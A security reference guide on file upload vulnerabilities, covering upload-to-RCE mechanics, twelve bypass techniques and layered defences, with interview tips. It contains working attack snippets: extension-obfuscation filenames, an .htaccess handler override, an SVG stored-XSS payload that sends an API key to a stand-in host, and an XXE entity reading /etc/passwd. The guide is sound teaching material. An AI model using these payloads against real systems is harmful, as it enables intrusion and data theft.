# File Upload Vulnerabilities

> An upload turns dangerous when the file's content is later interpreted (executed as server-side code, parsed as XML/SVG, or served with an active content type that a browser runs) or when the file's name/path is trusted (traversal, overwrite). The worst case, upload to remote code execution, needs two conditions to hold at once: the file contains code the server's runtime will execute, and it lands somewhere the server maps to that runtime and will serve. Every check a defender adds (extension, Content-Type, magic bytes, dimensions) is trying to break one of those two conditions, and every bypass below is about defeating one specific check while keeping both conditions true. The durable root-cause framing: validation of what a file "is" is guesswork against an attacker who controls every byte, so the real control is making the storage location non-executable and the served response inert. Get that right and a script that slips past validation still cannot run.

## How it works

To reason about upload-to-RCE you must know how a web server decides to execute a static file (PortSwigger). On request, the server parses the path, extracts the extension, and maps it to a MIME type via preconfigured rules. Then:

- Non-executable type (image, static HTML): the bytes are returned as-is.
- Executable type (for example `.php`) and the server is configured to execute it: the server sets request variables and runs the script, returning its output.
- Executable type but not configured to execute here: usually an error, but sometimes the source is served as `text/plain` (a source-disclosure bug, not RCE).

So RCE requires an extension the server both recognizes as executable and is configured to run in the directory where the file lands. That is why "which directory, configured how" matters as much as "which extension."

A multipart upload the attacker fully controls looks like this; note that three separate fields (`filename`, the part's `Content-Type`, and the raw bytes) are all attacker-set:

```
POST /images HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="image"; filename="avatar.php"
Content-Type: image/jpeg

(payload: a short script that runs a command from the cmd parameter and prints the result)
------X--
```

   The minimal payloads (PortSwigger): one that reads and prints an arbitrary server-side file, and one that runs a command taken from a `command` query parameter and prints the result, driven by `GET /uploads/shell.php?command=id`.

Web servers commonly use the `filename` field to decide the save name and location, which is exactly why filename handling is a security boundary and not cosmetic.

## Attack techniques

1. Unrestricted upload to web shell. If there is no real validation and the upload dir executes scripts, upload `shell.php` and request it. This is the ceiling of the bug: arbitrary read/write, data exfiltration, and pivoting to internal infrastructure and other hosts.

2. Content-Type (MIME) spoofing. The per-part `Content-Type` is client-controlled. Servers that trust it to gate uploads ("only `image/jpeg` and `image/png`") are bypassed by setting `Content-Type: image/jpeg` on a `.php` body in Burp Repeater. WHY: nothing ties the declared MIME to the actual bytes unless the server verifies content.

3. Extension blocklist gaps. Blocklisting is inherently leaky; equivalent executable extensions are easy to miss:

```
PHP:   .php3 .php4 .php5 .php7 .pht .phtml .phar .phps .inc
JSP:   .jsp .jspx .jspf .jsw .jsv
ASP:   .asp .aspx .ashx .asmx .ascx .cshtml .cer .asa
Other: .shtml (SSI)  .pl .cgi
```

4. Extension obfuscation (parser discrepancies). Defeat a blocklist by making the validator and the file system / handler disagree about the effective extension (PortSwigger):

```
shell.pHp                 # case, if validation is case-sensitive but the MIME map is not
shell.php.                # trailing dot stripped by the OS -> lands as shell.php
shell.php%20  shell.php.. # trailing space/dots stripped
shell.php%00.jpg          # null-byte truncation on legacy C-backed stacks
shell.asp;.jpg            # semicolon confusion (IIS legacy)
shell%2Ephp               # URL-encoded dot, if validated before decoding
shell.php.jpg             # double extension (see #5)
shell.p.phphp             # non-recursive strip of ".php" leaves ".php"
```

Also multibyte/unicode sequences (`0xC0 0xAE`, `0xC4 0xAE`, `0xC0 0x2E`) that normalize to `.` after UTF-8 to ASCII conversion. WHY: high-level validation code and low-level path handling parse the filename by different rules; the gap is the bug.

5. Double extension plus server config. `shell.php.jpg` is inert unless a handler executes on a non-terminal match. Apache with a loose `AddHandler application/x-httpd-php .php` (rather than `SetHandler` scoped by `<FilesMatch>`) or `MultiViews` will execute any file whose name contains `.php`, so `shell.php.jpg` runs. This is the classic reason double extensions matter: it is a server-config bug, not just a naming trick.

6. Magic-byte / content-sniff spoofing and polyglots. Stronger servers check that content matches the type: images have signatures (`FF D8 FF` JPEG, `GIF89a` GIF, `89 50 4E 47` PNG) and real dimensions, so a bare PHP file "has no dimensions" and is rejected. Bypass by prepending a valid signature or embedding the payload in metadata so `getimagesize()` and signature checks pass while the file still executes as PHP:

```
GIF89a;
(payload: a short script that runs a command from the cmd parameter and prints the result)
```

ExifTool trivially writes a PHP payload into an image comment/EXIF field, producing a polyglot that is a valid image and valid PHP (PortSwigger). Image libraries that validate but do not fully re-encode leave the payload intact.

7. Overriding server config via uploaded config files. If the upload dir is writable and the server honors per-directory config, upload the config itself to make an inert extension execute. Apache reads `.htaccess`; IIS reads `web.config` (PortSwigger):

```apache
# .htaccess uploaded into the upload dir
AddType application/x-httpd-php .l33t
# now shell.l33t executes as PHP even though .php was blocked
```

```xml
<!-- web.config: map an arbitrary extension to a handler, or enable execution -->
<staticContent><mimeMap fileExtension=".json" mimeType="application/json"/></staticContent>
```

8. PUT-method upload. If the server allows `PUT` (probe with `OPTIONS`), you can write a file without any upload form (PortSwigger):

```
PUT /images/exploit.php HTTP/1.1
Content-Type: application/x-httpd-php

(payload: reads and prints the contents of a server-side file path taken from the request)
```

9. Dangerous content that needs no server-side execution.
   - SVG is XML, so it is both a stored-XSS and an XXE vector when the "image" is served inline or parsed server-side:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>fetch('/api/key').then(r=>r.text()).then(t=>new Image().src='//oob/'+t)</script>
</svg>
<!-- XXE variant if parsed server-side -->
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>
```

   - HTML/`.htm` uploads served from the app's own origin are stored XSS (PortSwigger notes same-origin policy means this only works if the file is served from the origin it was uploaded to).
   - XML / DOCX / XLSX parsed server-side (Apache POI, XML libs) are XXE (PortSwigger's "parsing of uploaded files"; OWASP lists XXE and ImageTragick as parser threats).
   - Archives cause Zip Slip: an entry named `../../../../var/www/html/shell.php` escapes the extraction directory and writes anywhere the process can (Snyk's 2018 Zip Slip disclosure affected many libraries across ecosystems). Zip bombs / billion-laughs XML cause DoS by decompression (OWASP).

10. Filename path traversal, overwrite, and IDOR. If the server derives the save path from the user filename, `../../` in the name places the file outside the intended dir (into a webroot or over a sensitive file). Controlling the destination name lets you overwrite config, keys, or other users' files. Predictable/sequential stored names (or brute-forceable IDs) yield IDOR: read other users' uploads. OWASP: filenames can carry traversal, leading periods (hidden files), and OS-reserved names.

11. Race conditions. Some apps write the file to its live path, then delete it if AV/validation fails; for the milliseconds it exists you can request and execute it (PortSwigger). URL-based uploads (server fetches a URL) create a fetch-then-validate window; if the temp directory name comes from a weak PRNG like PHP `uniqid()`, it is brute-forceable, and padding the file to slow processing widens the window.

12. Secondary parser exploits and resource abuse. Malicious media triggering library bugs: ImageMagick "ImageTragick" (CVE-2016-3714) reached RCE via crafted image directives; crafted media can drive ffmpeg SSRF/file read; pixel-flood / decompression bombs exhaust memory. Missing `X-Content-Type-Options: nosniff` lets browsers content-sniff an "image" into HTML/JS for XSS.

Detection/confirmation across these: request the uploaded path and look for command output (RCE), an OOB DNS/HTTP callback (SVG/XXE, blind XXE, Zip Slip that writes a beacon), a rendered `alert`/exfil (stored XSS), or file contents in the response (XXE/LFI). Blind variants rely on OOB interaction exactly as with SSRF.

## Defense

Ordered by effectiveness; layer them (OWASP: no single technique suffices).

1. Make the storage non-executable and serve it inert. Store uploads on a different host or object store (S3/GCS), or at minimum outside the webroot, and serve them through an application handler that maps an opaque id to the file and sets `Content-Disposition: attachment`, a safe `Content-Type`, and `X-Content-Type-Options: nosniff`. This single control kills upload-to-RCE even if a script passes validation, and defangs content-sniffing XSS. OWASP's storage priority: different host > outside webroot > inside webroot write-only.

2. Disable execution in the upload location. If files must live under the webroot, strip handler mappings for that directory: no `AddHandler`/`SetHandler` for PHP/CGI, `php_admin_flag engine off`, remove CGI exec, and forbid uploading `.htaccess`/`web.config` (they are the mechanism to re-enable execution). Do not let user uploads share a directory with executable app code.

3. Allowlist extensions, enforced server-side after decoding, matched to business need. Permit only the specific safe extensions the feature requires (image feature: one agreed image type; CV feature: `pdf`/`docx`). Validate after fully decoding the filename so `%00`/`%2E`/unicode tricks cannot smuggle a second extension. Allowlists are far safer than blocklists because you enumerate the few safe types, not the infinite dangerous ones (PortSwigger, OWASP).

4. Rename to a random identifier and discard the user filename. Generate a UUID/GUID for storage; keep the original name only as display metadata after input validation. This removes path traversal, overwrite, null-byte, and double-extension tricks in one move (PortSwigger, OWASP).

5. Validate content, not just the header. Check the file signature/magic bytes and, for images, intrinsic properties, as a secondary gate (never as the sole gate, since polyglots defeat it). The strong version is to re-encode/transcode media through a trusted library so any embedded payload or polyglot does not survive; rasterize or sanitize SVG (or disallow SVG entirely); run PDFs/Office files through Content Disarm and Reconstruction (CDR). OWASP: image rewriting destroys injected content; validate DOCX with Apache POI.

6. Safe archive handling. For any zip/tar, canonicalize each entry path and verify it stays within the target directory before writing (defeats Zip Slip); enforce per-entry and total-uncompressed size and entry-count limits (defeats zip bombs). OWASP recommends avoiding ZIP acceptance where possible and safely extracting via hardened stream handling.

7. Do not persist to the live filesystem before validation, and prefer the framework's upload pipeline. Frameworks that stage to a randomized temp path, validate, then move, avoid the AV-delete and URL-fetch race windows. Rolling your own is where the subtle races appear (PortSwigger).

8. Enforce authz, limits, scanning, and origin isolation. Only authenticated/authorized users upload; enforce size, rate, and filename-length limits; scan with AV or a sandbox; authorize every download to prevent IDOR; and serve user content from a separate sandbox origin so even a stored-XSS file cannot touch the main app's cookies/DOM. Protect the upload endpoint against CSRF.

Reference: OWASP File Upload Cheat Sheet, OWASP Web Security Testing Guide (Testing Upload of Malicious Files), OWASP Input Validation Cheat Sheet, and ASVS V12 (File and Resources) requirements on upload validation, storage, and serving.

## Interview-grade nuances

- "We check the Content-Type" is the weakest answer: it is a client-set multipart header, spoofed in one line. "We check the extension is `.jpg`" is only slightly better: polyglots and double extensions plus loose Apache handlers beat it. The senior answer leads with non-executable storage and inert serving, then treats validation as defense-in-depth.
- The location and server config are half the vulnerability. Upload-to-RCE needs the file both to be executable and to land where the server executes it. Discussing extensions without asking "is that directory configured to run scripts, and is it under the webroot" misses the actual control.
- SVG is not a safe image. It is XML: stored XSS when rendered inline (same-origin) and XXE when parsed server-side. Many teams whitelist "images" and let SVG through; that is a live XSS/XXE sink. DOCX/XLSX/XML uploads are XXE for the same parsing reason.
- Blocklists lose; allowlists win. Naming `.phtml`, `.php5`, `.phar`, `.pht`, case variation, trailing dot/space, `%00`, and non-recursive-strip (`shell.p.phphp`) demonstrates you know why enumeration fails. But note that even a perfect allowlist does not stop the dangerous-without-RCE class (SVG/XXE/Zip Slip), which is why storage/serving controls matter independently.
- Renaming to a random id is a high-leverage, low-cost control that quietly removes traversal, overwrite, IDOR-by-guessing, and filename-parsing tricks at once. Weak candidates forget the filename is attacker data used to pick a save path.
- Zip Slip is a traversal bug in extraction, not in upload naming. The fix is canonicalize-and-prefix-check per entry, plus decompression limits. Confusing it with generic filename traversal is a tell.
- Race-condition and URL-fetch uploads are the subtle path even against robust validation: file exists briefly before AV deletes it, or a `uniqid()` temp dir is brute-forceable. Mentioning these signals depth beyond the standard extension checklist.
- `nosniff` plus `Content-Disposition: attachment` plus a separate origin is the trifecta that neutralizes served-content XSS. Naming all three, and why (MIME sniffing, forced download, cookie isolation), separates senior from junior.

## Sources

- PortSwigger Web Security Academy, File upload vulnerabilities (server static-file handling, flawed validation, extension obfuscation, polyglots, race conditions, PUT, client-side scripts, parser XXE): https://portswigger.net/web-security/file-upload
- OWASP File Upload Cheat Sheet (extension allowlist, Content-Type and signature validation, filename safety, storage location, content validation/CDR, permissions, size limits): https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP Web Security Testing Guide, Test Upload of Malicious Files (WSTG-BUSL-09): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
- Snyk, Zip Slip vulnerability (arbitrary file write via archive extraction): https://github.com/snyk/zip-slip-vulnerability
- ImageTragick (ImageMagick CVE-2016-3714) advisory: https://imagetragick.com/
